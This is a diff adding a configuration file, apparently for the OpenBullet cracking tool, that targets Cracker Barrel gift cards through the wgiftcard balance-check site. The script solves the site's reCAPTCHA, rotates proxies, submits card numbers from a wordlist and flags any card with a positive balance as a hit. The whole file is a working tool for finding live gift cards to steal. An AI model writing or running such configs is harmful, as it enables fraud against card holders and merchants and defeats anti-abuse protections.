@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "Cracker Barrel GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-18T13:50:11.8298465+00:00",
+  "AdditionalInfo": "",
+  "Author": "Tunacan",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://merchant.wgiftcard.com/card/balance/check/crackerbarrel/1" "6LcmqwITAAAAAD_8PDdcM-9AhyftRNtFXn1U5e_8" -> VAR "RECAP" 
+REQUEST POST "https://merchant.wgiftcard.com/card/balance/checkBalance/crackerbarrel/1" AutoRedirect=TRUE 
+  CONTENT "card_number=<USER>&g-recaptcha-response=<RECAP>&submit" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "The balance on your gift card ending with" ".</div>" Recursive=FALSE -> CAP "Balance" "" "" 
+PARSE "<SOURCE>" LR "is $" ".</div>" Recursive=FALSE -> VAR "BALANCE" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "<BALANCE>" LessThan "0.01" 
+  KEYCHAIN Success OR 
+    KEY "The balance on your gift card ending with" 
